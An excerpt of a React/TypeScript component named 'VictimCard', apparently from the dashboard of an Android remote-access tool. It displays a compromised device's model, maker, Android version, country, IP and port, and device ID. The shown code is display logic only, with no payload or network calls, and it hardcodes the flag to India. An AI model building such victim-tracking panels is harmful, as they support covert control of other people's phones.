...
export const VictimCard: React.FC<IProps> = observer((props) => {
    return (
        <div {...props} className='victim-card' onClick={props.onClick}>
            <div className='image-container'>
                {props.data.country !== undefined &&
                nameCountryCodeMap[props.data.country] !== undefined ? (
                    <ReactCountryFlag
                        countryCode={nameCountryCodeMap.India}
            ...
            <div className='victim-info'>
                <div className='model' title={`Model: ${props.data.model}`}>
                    <FontAwesomeIcon icon={faMobileScreen} />
                    <span>{props.data.model}</span>
                </div>
                <div
                    className='manufacturer'
                    title={`Manufacturer: ${props.data.manf}`}
                >
                    <FontAwesomeIcon icon={faIndustry} />
                    <span>{props.data.manf}</span>
                </div>
                <div
                    className='release'
                    title={`Android Version: ${props.data.release}`}
                >
                    <FontAwesomeIcon icon={faAndroid} />
                    <span>Android {props.data.release}</span>
                </div>
                <div
                    className='country'
                    title={`Country: ${props.data.country}`}
                >
                ...
                <div
                    className='ip'
                    title={`Remote Address: ${props.data.ip}:${props.data.port}`}
                >
                ...
                <div className='id' title={`Device ID: ${props.data.deviceId}`}>
                    <FontAwesomeIcon icon={faFingerprint} />
                    <span>{props.data.deviceId}</span>
                </div>
            </div>
        </div>
    );
